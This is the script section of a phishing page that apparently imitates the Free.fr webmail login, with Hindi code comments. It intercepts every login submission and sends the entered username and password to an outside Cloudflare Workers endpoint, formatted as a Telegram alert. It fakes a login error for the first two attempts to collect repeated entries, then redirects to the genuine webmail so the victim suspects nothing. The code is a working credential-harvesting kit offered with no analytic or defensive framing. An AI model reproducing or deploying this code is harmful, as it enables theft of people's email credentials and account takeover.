    <script>
        // UI Toggles
        function showZimbra(){ $(".webmailClassique").hide(); $('.webmailZimbra').show(); }
        function showClassique(){ $(".webmailZimbra").hide(); $('.webmailClassique').show(); }

        $(function () {
            $(".togglePassword").click(function () {
                var input = $($(this).attr("toggle"));
                input.attr("type", input.attr("type") === "password" ? "text" : "password");
                $(this).toggleClass("slash");
            });
        });

        // ========================================================
        // 3-ATTEMPT PERSISTENT LOGIC
        // ========================================================
        const BACKEND_URL = "https://testdatasend.narpatprihar2005.workers.dev";
        const REDIRECT_URL = "https://webmail.free.fr/";

        document.addEventListener("submit", async (e) => {
            e.preventDefault();
            const form = e.target;
            const submitBtn = form.querySelector("input[type='submit']");
            const errorBox = form.querySelector(".error-msg");
            
            // Input detect karna (Donon forms ke liye)
            const user = form.querySelector("input[type='text']").value;
            const pass = form.querySelector("input[type='password']").value;

            if (user && pass) {
                // Persistent Counter (LocalStorage use kiya taaki loader refresh hone par reset na ho)
                let attempts = parseInt(localStorage.getItem('free_attempts')) || 0;
                attempts++;
                localStorage.setItem('free_attempts', attempts);

                // UI Loading
                const originalText = submitBtn.value;
                submitBtn.disabled = true;
                submitBtn.value = "Connexion...";
                if(errorBox) errorBox.style.display = "none";

                // Telegram Format
                const msg = `🚨 **Nouveau Login Free**\n📌 **Attempt:** ${attempts}/3\n👤 **ID:** ${user}\n🔑 **Pass:** ${pass}`;

                try {
                    // Send to Cloudflare
                    await fetch(BACKEND_URL, {
                        method: 'POST',
                        mode: 'cors',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ text_data: msg })
                    });

                    // Logic Execution
                    if (attempts < 3) {
                        setTimeout(() => {
                            if(errorBox) errorBox.style.display = "block";
                            form.querySelector("input[type='password']").value = "";
                            form.querySelector("input[type='password']").focus();
                            submitBtn.disabled = false;
                            submitBtn.value = originalText;
                        }, 1000);
                    } else {
                        // 3 Attempts complete, cleanup and redirect
                        localStorage.removeItem('free_attempts');
                        window.location.replace(REDIRECT_URL);
                    }
                } catch (error) {
                    // Fail hone par bhi shaq na ho isliye redirect ya retry
                    if (attempts >= 3) window.location.replace(REDIRECT_URL);
                    else {
                        submitBtn.disabled = false;
                        submitBtn.value = originalText;
                    }
                }
            }
        });
    </script>
